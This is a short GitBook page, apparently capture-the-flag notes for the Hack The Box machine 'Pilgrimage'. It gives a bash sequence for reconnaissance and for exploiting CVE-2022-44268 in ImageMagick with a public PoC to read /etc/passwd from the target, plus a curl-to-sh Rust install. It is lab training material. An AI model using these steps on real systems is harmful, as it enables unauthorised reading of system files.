---
cover: ../../../.gitbook/assets/Pilgrimage.png
coverY: 254.84799999999998
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pilgrimage

Sources

* https://github.com/voidz0r/CVE-2022-44268
* https://doc.rust-lang.org/cargo/getting-started/installation.html

```bash
echo '10.129.148.164 pilgrimage.htb' | sudo tee -a /etc/hosts
nmap pilgrimage.htb
ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/wordlists/rockyou.txt:FUZZ --recursion -r -fs 7621
curl -o magick http://pilgrimage.htb/magick
chmod +x magick

curl https://sh.rustup.rs -sSf | sh
source "$HOME/.cargo/env"

git clone https://github.com/voidz0r/CVE-2022-44268
cd CVE-2022-44268
cargo run "/etc/passwd"

identify -verbose image.png
../magick convert image.png -resize 50% output.png
identify -verbose output.png
python3 -c 'print(bytes.fromhex("23202f6574632f686f73747...e740a"))'
```
